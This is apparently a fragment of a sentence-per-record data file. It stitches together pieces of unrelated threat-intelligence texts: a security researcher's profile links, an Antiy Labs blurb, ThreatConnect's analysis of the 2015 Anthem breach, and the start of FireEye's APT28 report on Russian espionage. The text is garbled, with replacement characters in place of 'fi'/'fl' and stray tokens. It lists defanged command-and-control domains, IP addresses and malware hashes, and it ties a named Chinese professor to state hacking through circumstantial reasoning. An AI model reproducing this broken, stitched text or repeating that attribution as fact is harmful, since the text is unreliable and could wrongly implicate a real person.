Regional CCDC - 2013 National CCDC 2012 - 2014 Projects .", "295": "Published works .", "296": "The Design of a Proofreading Software Service Agent - based Traffic Generation Contribution .", "297": "Projects .", "298": "Reference linking .", "299": "https://plus.google.com/116899857642591292745/posts \uff08google+\uff09 https://github.com/rsmudge ( GitHub ) https://www.youtube.com/channel/UCJU2r634VNPeCRug7Y7qdcw ( youtube ) http://www.oldschoolirc.com/ https://twitter.com/rsmudge http://www.hick.org/~raffi/index.html http://www.blackhat.com/html/bh-us-12/speakers/Raphael-Mudge.html http://www.linkedin.com/in/rsmudge Antiy Labs is a professional next - generation security - testing engine R&D enterprise .", "300": "Antiy 's engines provide the ability to detect various viruses and malware for network security products and mobile devices , which are used by more than ten well known security vendors .", "301": "Antiy 's engines are embedded in tens of thousands of firewalls and tens of millions of mobile phones all over the world .", "302": "Antiy Labs is awarded the \" Best Protection \" prize by AV - TEST in 2013 .", "303": "Based on engines , sandboxes and background systems , Antiy Labs will continue to provide traffic - based anti - APT solutions for enterprises .", "304": "More information about antivirus engine , http://www.antiy.com ( Chinese ) http://www.antiy.net ( English ) More information about anti - APT products of http://www.antiy.cn Antiy ,", "305": "Posted February 27 , 2015 by ThreatConnect Intelligence Research Team ( TCIRT)[1 ] \ufffdled under Threat Research[2 ] .", "306": "UPDATE : Premera Latest Healthcare Insurance Agency to be Breached[3 ] When news of the Anthem breach was reported on February 4th , 2015 , the security industry quite understandably went wild .", "307": "A breach of this magnitude was certainly unprecedented .", "308": "Naturally , many industry professionals were keenly interested in digging into this incident to see what could be uncovered , and the research team at ThreatConnect was no exception .", "309": "Thanks to our powerful API[4 ] and third - party partner[5 ] integrations , we were able to use ThreatConnect to quickly uncover a wealth of intelligence even when initially hindered by a relative lack of investigative lead information and context , a key requirement of any Threat Intelligence Platform[6 ] ( TIP ) .", "310": "However , before we delve into what we were able to uncover , let 's brie\ufffdy review the facts as they stood in the wake of the initial discovery announcement .", "311": "On the morning of February 4th , 2015 , several major news outlets broke the story[7 ] that Anthem , Inc. 's network defenses had been breached .", "312": "According to a statement from Anthem 's CEO[8 ] , the company fell victim to a \" very sophisticated external cyber attack , \" and the hackers \" obtained \" the personally identi\ufffdable information ( PII ) of approximately 80 M customers .", "313": "This included social security numbers , birthdays , street addresses , phone numbers and income data \u2013 plenty of information to enable identity theft .", "314": "This was a signi\ufffdcant event for several reasons .", "315": "Anthem , formerly known as Wellpoint , is the largest managed healthcare company in the Blue Cross Blue Shield Association , and by extension , one of the largest healthcare organizations in the United States .", "316": "As such , any compromise , no matter how insigni\ufffdcant , would likely impact countless individuals .", "317": "Blue Cross Blue Shield provides healthcare coverage for about half the U.S.", "318": "federal workforce .", "319": "This means that their information was potentially compromised too .", "320": "Unlike the Sony hack which was destructive in nature and meant to send a message for coercive purposes , the Anthem compromise was purportedly very covert , a fact which may suggest something about the adversary 's motives .", "321": "As of late February 2015 , there have not been any indications that the ex\ufffdltrated PII data was immediately commoditized on the black market for the purpose of enabling identity theft , as was the case in the Home Depot Breach .", "322": "Obviously , these high - level observations do not provide cybersecurity researchers a great deal of information to work with .", "323": "However , when presented within the context of a Threat Intelligence Platform ( TIP ) , an incomplete trail of evidence can highlight intelligence gaps , a study of which can orient threat researchers towards their analytic objectives .", "324": "To this end , let 's examine what we wanted to discover in the context of the Anthem breach : Who was responsible for the attack ? What was the objective of the attack ? Was it cyber theft , an espionage operation , or something different ? Who was targeted in the attack ? The answer to this question , obscured as it may be , would likely shed some light on the objective of the breach .", "325": "What was the timeline of the activity ? The real power of a Threat Intelligence Platform is demonstrated when you are able to collect and maintain a robust dataset of threat indicators , both past and present , which can help orient you in the right direction in the wake of a newly discovered breach .", "326": "Even when you do not have a good deal of information to start with ( for example a \ufffdle hash , or an IP address ) , you may \ufffdnd leads by pivoting through archived datasets until you uncover key pieces of the puzzle .", "327": "In the case of the Anthem breach , we were able to do just that .", "328": "In September 2014 , the ThreatConnect Intelligence Research Team ( TCIRT)[9 ] observed a variant of the Derusbi APT malware family , MD5 : 0A9545F9FC7A6D8596CF07A59F400FD3[10 ] , which was signed by a valid digital signature from the Korean company DTOPTOOLZ Co.", "329": "Derusbi is a family of malware used by multiple actor groups but associated exclusively with Chinese APT .", "330": "TCIRT began tracking the DTOPTOOLZ signature for additional signed malware samples and memorialized them within our Threat Intelligence Platform over time .", "331": "Analyst Comment : The DTOPTOOLZ signature has also been observed in association with Korean Adware that is af\ufffdliated with the actual DTOPTOOLZ Co.", "332": "This adware should not be confused with the APT malware that is abusing the same digital signature .", "333": "Later , in mid - November we discovered another implant that was digitally signed with the DTOPTOOLZ signature .", "334": "This implant , MD5 : 98721c78dfbf8a45d152a888c804427c[11 ] , was from the \" Sakula \" ( aka .", "335": "Sakurel ) family of malware , a known variant of the Derusbi backdoor , and was con\ufffdgured to communicate with the malicious command and control ( C2 ) domains extcitrix.we11point[.]com and www.we11point[.]com .", "336": "Through our Farsight Security passive DNS[12 ] integration , we uncovered that this malicious infrastructure was likely named in such a way to impersonate the legitimate Wellpoint IT infrastructure .", "337": "Passive DNS and historic DomainTools Whois data also provided insights that helped establish an initial timeline dating back to April 2014 , when the faux domains came into existence and were later operationalized by the attackers .", "338": "A Threat Intelligence Platform should allow for analysts to easily put together and organize such insights , collaborate around relevant analysis internally , and share the \ufffdnished analysis with external industry groups and organizations .", "339": "In the hopes that our community members could bene\ufffdt from or provide further insight into this suspicious incident , we immediately shared our threat intelligence including indicators , signatures and analytical context to the ThreatConnect Medical and Health Community[13 ] on November 13 , 2014 .", "340": "This included sending out a noti\ufffdcation to all stakeholders as well as our followers on Twitter[14 ] .", "341": "When the Anthem breach later came to light in early February , we re - shared the signatures , indicators and context freely to the entire ThreatConnect user base .", "342": "As we dug further , we expanded our understanding of the malicious we11point[.]com infrastructure , taking particular interest to the subdomains such as \" extcitrix.we11point[.]com and \" hrsolutions.we11point[.]com \" .", "343": "Note the \" citrix \" and \" hr \" ( human resources ) pre\ufffdxes that the adversary used to mirror legitimate remote infrastructure and employee bene\ufffdts resources in the May 2014 timeframe .", "344": "This provided initial insights as to the likely targeting themes and or vectors in which the adversary may have used when initiating their targeting campaign .", "345": "[ 15 ] The fact that the malicious infrastructure closely mirrored other legitimate Wellpoint infrastructure supported our hypothesis that the Derusbi / Sakula malware was con\ufffdgured to operate and persist within a speci\ufffdc target enterprise .", "346": "Retrospective analysis of other targeted malware samples using the DTOPTOOLZ Co.", "347": "digital signature led to the identi\ufffdcation of an \" HttpBrowser \" / \" HttpDump \" implant MD5 : 02FAB24461956458D70AEED1A028EB9C[17 ] ( OpenOf\ufffdcePlugin.exe ) , which was \ufffdrst observed on December 11 , 2013 .", "348": "Although this malware sample is not Derusbi / Sakula , it too is strongly believed to be associated with Chinese APT activity and in fact may have also been involved in a Blue Cross Blue Shield targeting campaign as early as December 2013 .", "349": "This particular binary is con\ufffdgured to connect to the static IP address 142.91.76[.]134 .", "350": "Passive DNS of this IP indicates that on December 11th , 2013 , the same date as the malware sample was observed , the domain prennera[.]com also resolved to 142.91.76[.]134 .", "351": "It is believed that the prennera[.]com domain may have been impersonating the Healthcare provider Premera Blue Cross[19 ] , where the attackers used the same character replacement technique by replacing the \" m \" with two \" n \" characters within the faux domain , the same technique that would be seen \ufffdve months later with the we11point[.]com command and control infrastructure .", "352": "Section Summary : The Derusbi / Sakula malware implant types are unique in that they have traditionally been seen within Chinese APT espionage campaigns .", "353": "The \" HttpBrowser \" / \" HttpDump \" malware implant ( while a different family of malware than Derusbi / Sakula ) is also believed to be of Chinese origin , and was also digitally signed with the DTOPTOOLZ digitalsignature .", "354": "We believe that the prennera[.]com domain may be impersonating Premera Blue Cross ( premera.com ) , using a similar character replacement technique seen in the we11point[.]com campaign .", "355": "Another powerful attribute of ThreatConnect is the ability for analysts to logically group items such as atomic indicators , related documents or signatures , all of which may include individualized custom context enrichments and associations .", "356": "Over time , the ability to memorialize groupings of related or like activity allows analysts to quickly uncover non - obvious relationships within their private datasets .", "357": "This is exactly what happened as we continued to investigate these incidents .", "358": "As industry analysts and media speculated Chinese APT involvement[20 ] in the Anthem breach , our focus into the Derusbi / Sakula malware signed with the DTOPTOOLZ Co.", "359": "digital signature shifted from the we11point[.]com incident to another cluster of activity that occurred later in May 2014 .", "360": "We immediately reviewed Incident 20140526B : vaeit APT[21 ] , an incident that we initially shared to our Subscriber Community on September 29 , 2014 after conducting retrospective analysis .", "361": "[ 22 ] Just as was the case with the we11point[.]com and prennera[.]com incidents , the VAE , Inc.", "362": "incident is also believed to be associated with Chinese APT espionage activity .", "363": "In this case the adversary also used Derusbi / Sakula malware that was signed with the DTOPTOOLZ Co.", "364": "digital signature and con\ufffdgured to communicate with faux infrastructure appearing to be masquerading as internal resources for the Department of Defense Contractor VAE , Inc.", "365": "Additionally , in response to an inquiry from KrebsOnSecurity , VAE , Inc.", "366": "would later con\ufffdrm[24 ] that it had indeed been a target of a failed spearphishing attempt in May 2014 which used the malicious faux VAE , Inc.", "367": "themed domain .", "368": "The targeted incident relied upon the Sakula executable MD5 : 230D8A7A60A07DF28A291B13DDF3351F[25 ] which had a XOR 0x9A encoded C2 callbacks to the IP address 192.199.254[.]126 ( registered to Wehostwebsites[.]com \u2013 \" Tom Yu \" of Baoan , Shenzhen City , Guangdong Province , China ) as well as a hardcoded callback to sharepoint - vaeit[.]com .", "369": "Passive DNS of the static C2 IP 192.199.254[.]126 revealed a single suspicious domain of interest \u2013 topsec2014[.]com .", "370": "This domain had historic resolution around May 8 , 2014 within a month of the \ufffdrst observed Sakula activity using the IP 192.199.254[.]126 as C2 .", "371": "[ 26 ] [ 27 ] Using historic Whois , we discovered that topsec2014[.]com was initially registered by li2384826402@yahoo[.]com on May 6th , 2014 .", "372": "Although the li2384826402@yahoo[.]com registrant is likely a reseller given that it has been observed registering several thousands of other domains , the fact that it was used to register both the faux VAE , Inc.", "373": "C2 infrastructure and the overlapping domain topsec2014[.]com within the same month suggests that there may be a relationship between the client of the reseller for the VAE , Inc.", "374": "infrastructure and the client for topsec2014[.]com .", "375": "[ 28 ] [ 29 ] Just four minutes after the initial registration of topsec2014[.]com , the Whois records were updated from the initial registrant , Li Ning \u2013 li2384826402@yahoo[.]com to TopSec China \u2013 TopSec_2014@163[.]com .", "376": "This domain record has been unchanged since May 7th 2014 .", "377": "The we11point[.]com infrastructure and by extension the faux VAE Inc.", "378": "infrastructure is associated with Cluster 2 of the ScanBox framework[30 ] by PwC.", "379": "The latest PwC update to ScanBox states that there are \" links between the domain allegedly used in the Anthem hack ( we11point.com ) to Cluster 2 through shared WHOIS details . \" < setion > One notable pattern was how the domain Whois registration information for the VAE , Inc.", "380": "themed infrastructure was quickly updated and obfuscated with pseudorandom 10 character gmx.com email addresses and using the names of various comic book characters from the Iron Man franchise .", "381": "This comic - themed naming convention has been previously documented by our friends at Crowdstrike[31 ] in what they characterize as being associated with a Chinese APT group they have dubbed \" Deep Panda \" .", "382": "Leveraging our DomainTools partnership , we were able to correlate the outlier domain opm - learning[.]org .", "383": "This domain was also purportedly registered by the Iron Man movie hero \" Tony Stark \" on July 28 , 2014 .", "384": "This infrastructure naming convention suggests a possible Of\ufffdce of Personnel Management ( OPM ) theme .", "385": "However , in this case we lacked any speci\ufffdc sample of malware to verify our initial suspicions that this infrastructure was operational .", "386": "The possible OPM reference in the domain name is noteworthy considering it was revealed in July of 2014 that OPM had been compromised[32 ] by a likely state - sponsored Chinese actor in mid - March of that year .", "387": "The fact this domain was registered after the breach occurred suggests that OPM could be an ongoing direct target of Chinese state - sponsored cyber espionage activity .", "388": "Our attention then turned to the FBI Flash Report A-000049- MW[33 ] that was publicly reported by Brian Krebs [ 34]on February 6th , 2015 .", "389": "This FBI Flash Report was issued on January 27th , 2015 , the same day an Anthem administrator detected suspicious activity according to an internal memo[35 ] .", "390": "This memo goes on to indicate that the FBI would not be party to the Anthem breach until they were noti\ufffded on January 29th , 2015 ; based on these facts we assess with high con\ufffddence that it is very unlikely that the FBI Flash Report was directly related to the Anthem breach .", "391": "Rather , we suspect that the FBI \ufffdash report likely references the USIS breach that was announced[36 ] on August 6 , 2014 , or the previous OPM breach , considering the statement that the breach involved \" compromised and stolen sensitive business information and Personally Identi\ufffdable Information ( PII ) from US commercial and government networks through cyber espionage . \" The malware referenced within the FBI Report is associated with a Derusbi backdoor subvariant named \" InfoAdmin \" / \" Kakfum \" where the FBI speci\ufffdcally references open source reporting of \" Deep Panda \" as being related to the malware observed in the attack .", "392": "The malicious infrastructure highlighted in the report are the domains images.googlewebcache[.]com and smtp.outlookssl[.]com .", "393": "Both of these top level domains were included with other related domains , all of which were shared on September 16th , 2013 to the ThreatConnect Subscriber Community in Incident 20130823C : Some . Trouble APT Domains[37 ] , roughly a year and half prior to the FBI Flash report .", "394": "It is important to mention that both the domains images.googlewebcache[.]com and smtp.outlookssl[.]comas were also previously identi\ufffded in an October 2014 PwC blog post[38 ] as seen within Cluster 1 of the Scanbox framework , while the Sakula activity with we11point and VAEIT is contained within Cluster 2 of that report .", "395": "This implies that the actor referenced within the FBI Flash report uses shared capabilities ( in this case the ScanBox kit ) with the Sakula / we11point actor .", "396": "Section Summary : The Derusbi / Sakula malware seen in both the we11point[.]com and VAE Inc.", "397": "campaigns were structurally the same and digitally signed with the DTOPTOOLZ signature .", "398": "The emerging theme is that this particular signature and family of malware is highly indicative of a particular Chinese APT activity .", "399": "Within this web of malicious infrastructure , there is an interesting overlap with the topsec2014[.]com domain and attack infrastructure .", "400": "TCIRT identi\ufffded a domain opm - learning[.]org that had a similar superhero themed WHOIS registrant to the Sakula / VAE Inc.", "401": "infrastructure .", "402": "The possible OPM reference is noteworthy considering the Of\ufffdce of Personnel Management ( OPM ) was compromised in March 2014 .", "403": "Additionally , an FBI Flash Report 0000 - 49MW referenced indicators that were possibly associated with the USIS hack and a Derusbi variant called \" Kakfum \" / \" InfoAdmin \" .", "404": "Both the FBI Flash infrastructure and the Sakula / VAE Inc.", "405": "infrastructure are tied to the capability usage of the ScanBox framework , residing in Clusters 1 and 2 respectively .", "406": "The Professor We conducted open source research in pursuit of further information on the TopSec_2014@163[.]com email registrant .", "407": "A keyword search returned several results for \" topsec2014@163[.]com \" in association with a number of academic institutions in Nanjing , China .", "408": "Although the email address was n't an exact match to the topsec2014[.]com domain registrant ( notice the absence of the underscore ) , such a similarity warranted further investigation .", "409": "[ 39 ] [ 40 ] http://www.threatconnect.com / news / the - anthem- ...", "410": "We examined the links for any relevant intelligence , and discovered that nearly all of the search results led to pages that contained an announcement for an information security competition sponsored by the Southeast University - Topsec Information Security and Mobile Internet Technology Joint Research Center .", "411": "This entity appears to be a joint research venture between the University and Chinese networking giant Beijing Topsec Network Security Technology Co. , a.k.a .", "412": "Beijing Topsec .", "413": "[ 41 ] [ 42 ] The announcements list a Professor \" Song Yubo \" as the point of contact for the event , and directs interested parties to his email address , topsec2014@163[.]com , for further questions .", "414": "[ 43 ] [ 44 ] According to his LinkedIn page , Song is a Teacher at the Southeast University , speci\ufffdcally interested in the \ufffdeld of telecommunications .", "415": "Additionally , he is an avid researcher , and has published numerous academic papers on computer network exploitation on various e - journal publication sites , such as Google Scholar[45 ] .", "416": "Further , he lists skills such as \" cryptography , \" \" penetration testing \" and \" computer network security , \" etc .", "417": "on his Research Gate pro\ufffdle[46 ] .", "418": "[ 47 ] [ 48 ] As we continued to develop a pro\ufffdle on Professor Song , we began to have the sense that his interest in information security research strongly overlapped with that of someone who might be interested in or at least capable of conducting sophisticated cyber attacks .", "419": "However , interests alone are not enough to warrant reasonable suspicion , so we had to do more digging .", "420": "Additionally , the soft link between TopSec_2014@163[.]com and topsec2014@163[.]com alone was not suf\ufffdcient to make associations with any reasonable con\ufffddence , but as it turns out , Yubo has in fact been previously named as a person of interest in the context of offensive Chinese cyber activity .", "421": "In March 2012 , Northrop Grumman presented a commissioned report to Congress[49 ] detailing Chinese cyber warfare capabilities .", "422": "The report asserts with high con\ufffddence that both Song and the Information Security Research Center at Southeast University have received numerous state - sponsored research grants , and by extension , cooperated with the Government of China in conducting information security research and development ( R&D ) .", "423": "As stated on Southeast University 's own website , the main purpose of these grants are to develop technical acumen amongst its students via providing support for \" state - owned scienti\ufffdc research institutions , state key enterprises , government agencies and People 's Liberation Army ( PLA ) units . \" [ 50 ] [ 51 ] Southeast University is one of only three Chinese academic institutes that receives funding from all \ufffdve of the State grant programs .", "424": "Song himself has also conducted his fair share of state- sponsored research , notably under the National Ministry of State Security 115 Program \u2013 a highly sensitive research grant to fund ambiguous information warfare R&D , almost certainly in support of PLA programs .", "425": "As we can see , the evidence continued to stack up .", "426": "The real smoking gun , however , was when we began to notice a strong temporal overlap with the various stages of the TOPSEC Cup that Song and Beijing Topsec were organizing , and the registration dates of malicious infrastructure as well as the malware compilation dates .", "427": "[ 52 ] [ 53 ] Based upon the translated registration form that we obtained from Song Yubo 's personal Baidu document sharing account , open registration for the \" TOPSEC Cup \" began on May 4th , 2014 and would close on May 14th , 2014 .", "428": "The details of the competition that were shared on the announcement are extremely ambiguous , and probably for good reason .", "429": "The introductory paragraph mentions that the primary goal of the event is to facilitate the training and discovery of new talent , noting that exceptional participants would receive priority consideration for internships and jobs with Beijing Topsec .", "430": "The event itself was broken down into several distinct rounds of competition .", "431": "Firstly , the preliminary round required that all eligible registrants would attempt to remotely access and navigate through the network .", "432": "Should a participating team perform exceptionally in the preliminary qualifying round , they would be invited to participate in the \ufffdnal round on - site in Nanjing .", "433": "In this \ufffdnal round , participants would be required to build their own \" information systems and network environments . \" The announcement notes that the students must rely upon their own laptop and software tools to accomplish this task .", "434": "Further , the announcement notes that participants are prohibited from attacking the provided server as well as their competitors .", "435": "Section Summary : Song Yubo and his research center at Southeast University appear to be central players in this narrative , as highlighted by their \ufffdnancial connections to the government of China , in particular the Ministry of State Security ( MSS ) , China 's premier human intelligence agency .", "436": "If the MSS was involved , we can deduce that the Anthem hack could have been for the purposes of gathering sensitive information for follow - on HUMINT targeting via blackmail , asset recruitment or technical targeting operations against individuals at home .", "437": "Song 's use of the topsec email alias suggests a greater association w/ TOPSEC .", "438": "It seems as if the competition is almost certainly the cause for the topsec2014[.]com domain .", "439": "What is very curious , however , is the initial registration by the reseller li2384826402@yahoo[.]com , which is a tactic seen within the con\ufffdrmed malicious faux VAE Inc.infrastructure .", "440": "The overlap between the competition website and the static command and control infrastructure seen in the Derusbi / Sakula implant is was likely an error made by the attackers .", "441": "The Company To enhance our open - source capabilities , we partnered up with Dr.", "442": "James Mulvenon[54 ] and his team of China experts at Defense Group , Inc.", "443": "( DGI)[55 ] .", "444": "We shared with them everything that we knew at the time , walking through the technical details which led us all the way to Song Yubo and the competition announcement .", "445": "From there , they were able to uncover a wealth of very consequential background information on Beijing Topsec Technology Co ( Beijing Topsec ) , the sponsoring organization for Song Yubo 's information security competition .", "446": "DGI 's research indicated that Beijing Topsec is one of the largest information security hardware providers in China .", "447": "In 1996 , they were the \ufffdrst Chinese company to break into the market with the release of China 's \ufffdrst indigenously - manufactured \ufffdrewall .", "448": "Since then , they have expanded their business to include a consulting practice focused on issues such as vulnerability mining , software code analysis , threat intelligence , and encryption R&D , amongst other things .", "449": "The company served as a core technical support unit for network security at the 2008 Olympic Games \u2013 an event which was tightly controlled by the state .", "450": "Additionally , Beijing Topsec is a known partner of the Chinese military .", "451": "Since 2009 , the company has possessed information publication credentials for military network procurement .", "452": "Since 2013 , they have been publicly recognized as the Chinese equivalent of a cleared defense contractor .", "453": "The links between Beijing Topsec and the Chinese government are fairly substantial , highlighted by long - standing partnerships between even the most shadowy elements of the Chinese military .", "454": "The Leaked Cable A very compelling piece of evidence is found in the contents of a leaked 2009 diplomatic security cable from the Department of State , published by The Guardian.[56 ] The cable is a daily digest of Diplomatic Security alerts \u2013 essentially a situational awareness primer for State Department employees to inform them of new and existing threats .", "455": "In one section , the cable highlights that the Founder of Beijing Topsec , He Weidong , had openly talked about receiving directives from the PLA in an interview with China News Network .", "456": "In the interview , the founder quite curiously states that Topsec is less a commercial entity , but rather a research institute , and that the company received about half of its start - up capital directly from the PLA .", "457": "The cable further claims that Topsec actively recruits for the PLA cyber army .", "458": "[ 57 ] [ 58 ] It would also appear that not only does Beijing Topsec have deep ties to state - run cyber activity , but also within the independent hacker community as well .", "459": "Of note , the company hired the notorious hacker Lin Yong , a.k.a .", "460": "\" Lion \" ( of the Honker Union of China[59 ] ) in the early 2000s as a security service engineer and to conduct network training .", "461": "Section Summary : It is not surprising that the Chinese government would be interested in partnering with a private organization such as Beijing Topsec for use as a front for state - sponsored activity .", "462": "The association between Southeast University and Beijing Topsec as manifested in the joint information security research center highlights the possibility of growing links between state - sponsored activity and academic institutions , particularly those that receive funding from the central government .", "463": "All in all , it would seem that China is pursuing a uni\ufffded approach to cyber operations , relying on all unique facets of the workforce : academia , private industry , and independent hackers , as well as the PLA to achieve their strategic goals .", "464": "The Anthem breach exposes the insidious reality of modern Chinese cyber espionage as it continues its unrelenting strikes at the soft underbelly of the American way of life .", "465": "Moreover , it demonstrates the imposing yet increasingly common reality of conducting threat intelligence analysis without substantial threat intelligence to start with .", "466": "Fortunately for us , we were able to deduce informed answers to some of the outstanding questions to this breach by scrutinizing our archival data troves that are ef\ufffdciently stored within our Threat Intelligence Platform and partner integrations .", "467": "In the \ufffdeld of cyber security , industry professionals must learn to play the long game in order to generate a proactive sense of situational awareness , allowing for greater ef\ufffdciency and \ufffdexibility in mitigating future threats .", "468": "Additionally , this incident underscores the frustrating disparity of the industry when it comes to naming conventions .", "469": "With so many threat actors and indicators \ufffdoating around , it is can be frustrating to keep track of all the disparate pieces of evidence , especially when countless naming conventions are applied .", "470": "Without the use of a Threat Intelligence Platform to keep track of the \ufffdood of incoming threat data , this task would be extraordinarily time consuming at best and crippling at worst .", "471": "Moving forward , it is important to bear in mind that the adversary , regardless of country of origin , shall almost certainly leverage our every weakness against us .", "472": "Even something as seemingly innocuous as confusion over names can easily consume analytical bandwidth , creating a window of opportunity to strike .", "473": "We \u2013 that is security professionals , private industry and governments alike \u2013 must proactively harden our network defenses and hasten our incident responses as a united , synchronous entity .", "474": "We have shared details on Song Yubo[60 ] and af\ufffdliated indicators within the ThreatConnect Common Community .", "475": "This share also includes the full - text DGI \" BLUE HERON \" research[61 ] which provides greater insight into Song Yubo , Southeast University and Beijing Topsec .", "476": "All things considered , industry must learn to adopt a cooperative defense mindset in the hopes of rebuf\ufffdng future attacks .", "477": "The most resolute defense we have is each other , so be like the TCIRT and start actively defending your own community from the next big breach .", "478": "Register for a free ThreatConnect account today[62 ] to get started sharing and analyzing your threat intelligence .", "479": "Our clients often ask us to assess the threat Russia poses in cyberspace .", "480": "Russia has long been a whispered frontrunner among capable nations for performing sophisticated network operations .", "481": "This perception is due in part to the Russian government 's alleged involvement in the cyber attacks accompanying its invasion of Georgia in 2008 , as well as the rampant speculation that Moscow was behind a major U.S. Department of Defense network compromise , also in 2008 .", "482": "These rumored activities , combined with a dearth of hard evidence , have made Russia into something of a phantom in cyberspace .", "483": "In this paper we discuss a threat group whose malware is already fairly well-known in the cybersecurity community .", "484": "This group , unlike the China-based threat actors we track , does not appear to conduct widespread intellectual property theft for economic gain .", "485": "Nor have we observed the group steal and profit from financial account information .", "486": "The activity that we profile in this paper appears to be the work of a skilled team of developers and operators collecting intelligence on defense and geopolitical issues \u2013 intelligence that would only be useful to a government .", "487": "We believe that this is an advanced persistent threat ( APT ) group engaged in espionage against political and military targets including the country of Georgia , Eastern European governments and militaries , and European security organizations since at least 2007 .", "488": "They compile malware samples with Russian language settings during working hours consistent with the time zone of Russia 's major cities , including Moscow and St. Petersburg .", "489": "While we do n't have pictures of a building , personas to reveal , or a government agency to name , what we do have is evidence of long- standing , focused operations that indicate a government sponsor \u2013 specifically , a government based in Moscow .", "490": "We are tracking this group as APT28 .", "491": "APT28 targets insider information related to governments , militaries , and security organizations that would likely benefit the Russian government .", "492": "Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years .", "493": "Since 2007 , APT28 has systematically evolved its malware , using flexible and lasting platforms indicative of plans for long-term use .", "494": "The coding practices evident in the group's malware suggest both a high level of skill and an interest in complicating reverse engineering efforts .", "495": "\u2022 Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years .", "496": "\u2022 APT28 malware , in particular the family of modular backdoors that we call CHOPSTICK , indicates a formal code development environment .", "497": "Such an environment would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time .", "498": "\u2022 APT28 tailors implants for specific victim environments .", "499": "Indicators in APT28 's malware suggest that the group consists of Russian speakers operating during business hours in Russia 's major cities .", "500": "More than half of the malware samples with Portable Executable ( PE ) resources that we have attributed to APT28 included Russian language settings ( as opposed to neutral or English settings ) , suggesting that a significant portion of APT28 malware was compiled in a Russian language build environment consistently over the course of six years ( 2007 to 2013 ) .", "501": "Over 96 % of the malware samples we have attributed to APT28 were compiled between Monday and Friday .", "502": "More than 89 % were compiled between 8AM and 6PM in the UTC+4 time zone , which parallels the working hours in Moscow and St. Petersburg .", "503": "These samples had compile dates ranging from mid-2007 to September 2014 .", "504": "Three themes in APT28 's targeting clearly reflect areas of specific interest to an Eastern European government , most likely the Russian government .", "505": "Many of APT28 's targets align generally with interests that are typical of any government .", "506": "However , three themes in APT28 's targeting clearly reflects areas of specific interest to an Eastern European government , most likely the Russian government .", "507": "These include the Caucasus ( especially the Georgian government ) , Eastern European governments and militaries , and specific security organizations .", "508": "This increases the likelihood that recipients will believe that the email is legitimate and will be interested in opening the message , opening any attached files , or clicking on a link in the body of the email .", "509": "Since spearphishing lures are tailored to the recipients whose accounts APT28 hopes to breach , the subjects of the lures provide clues as to APT28's targets and interests .", "510": "For example , if the group's lures repeatedly refer to the Caucasus , then this most likely indicates that APT28 is trying to gain access to the accounts of individuals whose work pertains to the Caucasus .", "511": "Similarly , APT28 's practice of registering domains that mimic those of legitimate news , politics , or other websites indicates topics that are relevant to APT28 's targets .", "512": "We identified three themes in APT28 's lures and registered domains , which together are particularly relevant to the Russian government .", "513": "In addition to these themes , we have seen APT28 target a range of political and military organizations .", "514": "We assess that the work of these organizations serves nation state governments .", "515": "The Caucasus , a region that includes Chechnya and other Russian republics and the independent states of Georgia , Armenia , and Azerbaijan , continues to experience political unrest .", "516": "The Georgian government 's posture and ties to the West are a frequent source of Moscow 's frustration , particularly after the 2008 war .", "517": "Overall , issues in the Caucasus likely serve as focal points for Russian intelligence collection efforts .", "518": "APT28 is likely seeking information on Georgia's security and diplomatic postures .", "519": "Specifically , the group has targeted the Georgian Ministry of Internal Affairs ( MIA ) and the Ministry of Defense ( MOD ) .", "520": "We also observed efforts to target a journalist working on issues in the Caucasus and a controversial Chechen news site .", "521": "APT28 made at least two specific attempts to target the Georgian Ministry of Internal Affairs .", "522": "The MIA harbors sensitive information about the inner workings of Georgia 's security operations , the country 's engagement in multilateral institutions , and the government 's communications backbone .", "523": "It is responsible for : APT28 made at least two specific attempts to target the MIA .", "524": "This probably referred to the MIA facility in the Ortachala district of Tbilisi , Georgia 's capital city .", "525": "APT28 also appeared to target Georgia 's MOD along with a U.S. defense contractor that was training the Georgian military .", "526": "The U.S. contractor was involved in a working group to advise the MOD and Georgian Armed Forces , assess Georgia's military capabilities , and develop a military training program for the country .", "527": "We believe that APT28 's targeting of the MOD aligns with Russian threat perceptions .", "528": "The growing U.S.-Georgian military relationship has been a source of angst for Russia .", "529": "Georgia and Russia severed diplomatic relations following the Russia-Georgia War in 2008 , and Georgia has since sought to align itself more closely with western security organizations .", "530": "Additionally , in June 2014 , despite Russia 's vocal objections , Georgia , along with Ukraine and Moldova , signed association accords with the EU .", "531": "This move placed all three countries more firmly in the EU 's political , economic , and security spheres of influence .", "532": "Georgian military security issues , particularly with regard to U.S. cooperation and NATO , provide a strong incentive for Russian state-sponsored threat actors to steal information that sheds light on these topics .", "533": "Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion , identify dissidents , spread disinformation , or facilitate further targeting .", "534": "( Reason Magazine is a US-based magazine ) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine .", "535": "The body of the letter suggests that APT28 actors are able to read at least two languages \u2013 Russian and English .", "536": "The grammar of the letter also indicates that English is not the author 's first language , despite it purportedly originating from a US-based magazine .", "537": "This implies that Russian may be the APT28 author 's preferred language .", "538": "Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion , identify dissidents , spread disinformation , or facilitate further targeting .", "539": "Several other nation states are suspected of targeting journalists and dissidents to monitor their activity , including China and Iran. , Journalists in the Caucasus working on Caucasus independence issues would be a prime target for intelligence collection for Moscow .", "540": "Journalists critical of the Kremlin have long been targets of surveillance and harassment , and a number of governments and human rights organizations have publicly criticized the government for its treatment of journalists and its increasing consolidation of control over the media .", "541": "Of particular note , the Kavkaz Center is a Chechen-run website designed to present an alternative view to the long-running conflict between Russia and Chechen separatists .", "542": "In 2004 and 2013 , Russia 's Foreign Minister voiced his displeasure that a Swedish company continues to host the Kavkaz Center website .", "543": "Eastern European countries ' political and military postures are traditionally core Russian government interests .", "544": "The Kremlin has long regarded the former Soviet Republics and satellite states as in its sphere of economic , political , and military interest .", "545": "Over the past two decades , as many of these states joined NATO and the EU , Russia has attempted to regain its influence in the region .", "546": "Many of APT28 's targets parallel this continued focus on Eastern European governments and militaries .", "547": "We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations : \u2022 In a late 2013 incident , a FireEye device deployed at an Eastern European Ministry of Foreign Affairs detected APT28 malware in the client 's network .", "548": "The Polish security company indicated that the sample was '' sent to the government , '' presumably the Polish government , given the company 's location and visibility .", "549": "We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations .", "550": "These domain registrations not only suggest that APT28 is interested in Eastern European political affairs , but also that the group targets Eastern European governments directly .", 